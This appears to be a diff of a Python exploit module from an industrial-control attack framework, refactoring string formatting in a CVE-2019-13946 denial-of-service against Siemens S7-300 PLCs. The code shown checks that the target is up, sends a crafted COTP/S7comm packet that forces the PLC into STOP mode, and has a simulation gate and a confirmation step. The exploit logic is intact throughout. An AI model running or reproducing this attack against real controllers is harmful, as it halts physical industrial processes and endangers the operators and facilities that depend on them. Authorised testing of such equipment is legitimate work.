@@ -70,7 +70,7 @@ _DOS_PAYLOAD = bytes.fromhex(
 )
 
 
-def _tcp_connect(target: str, port: int, timeout: int) -> Optional[socket.socket]:
+def _tcp_connect(target: str, port: int, timeout: int) -> socket.socket | None:
     """Open a TCP connection and return the socket, or None on failure."""
     try:
         sock = socket.create_connection((target, port), timeout=timeout)
@@ -147,13 +147,13 @@ class Exploit(Exploit):
         if self.simulate:
             DestructiveGate.print_simulation(
                 description=(
-                    "Would send a crafted S7comm packet over COTP/TPKT to {}:{}/TCP. "
+                    f"Would send a crafted S7comm packet over COTP/TPKT to {self.target}:{self.port}/TCP. "
                     "CVE-2019-13946 (CVSS 7.5) — malformed packet causes S7-300 CPU "
                     "to enter STOP mode without authentication. PLC immediately halts "
                     "execution of all ladder logic. Industrial process stops. "
-                    "Requires operator physical restart.".format(self.target, self.port)
+                    "Requires operator physical restart."
                 ),
-                payload_hex=" ".join("{:02X}".format(b) for b in _DOS_PAYLOAD),
+                payload_hex=" ".join(f"{b:02X}" for b in _DOS_PAYLOAD),
                 payload_human=(
                     "TPKT + COTP DT + crafted S7comm ACKDATA with malformed "
                     "return code and oversized data field -> CPU fault -> STOP"
@@ -172,21 +172,17 @@ class Exploit(Exploit):
             module_name="cve/cve_2019_13946_s7_300_profinet_dos",
             target=self.target,
             impact_level="HIGH",
-            description="Send PROFINET DoS to Siemens S7-300 at {}:{}".format(
-                self.target, self.port
-            ),
+            description=f"Send PROFINET DoS to Siemens S7-300 at {self.target}:{self.port}",
         )
         if not confirmed:
             return
 
-        print_status("[CVE-2019-13946] Checking if {}:{} is alive...".format(
-            self.target, self.port
-        ))
+        print_status(f"[CVE-2019-13946] Checking if {self.target}:{self.port} is alive...")
         if not _is_alive(self.target, self.port, self.timeout):
-            print_error("[CVE-2019-13946] TCP/{} not reachable.".format(self.port))
+            print_error(f"[CVE-2019-13946] TCP/{self.port} not reachable.")
             return
 
-        print_success("[CVE-2019-13946] Target {}:{} is alive.".format(self.target, self.port))
+        print_success(f"[CVE-2019-13946] Target {self.target}:{self.port} is alive.")
         print_status("[CVE-2019-13946] Sending crafted COTP + S7comm DoS packet...")
 
         try:
@@ -196,8 +192,8 @@ class Exploit(Exploit):
             sock.sendall(_DOS_PAYLOAD)
             sock.close()
             print_success(
-                "[CVE-2019-13946] Packet sent. Monitor {}:{} for loss of connectivity "
-                "(indicates CPU entered STOP mode).".format(self.target, self.port)
+                f"[CVE-2019-13946] Packet sent. Monitor {self.target}:{self.port} for loss of connectivity "
+                "(indicates CPU entered STOP mode)."
             )
         except Exception as exc:
-            print_error("[CVE-2019-13946] Error: {}".format(exc))
+            print_error(f"[CVE-2019-13946] Error: {exc}")
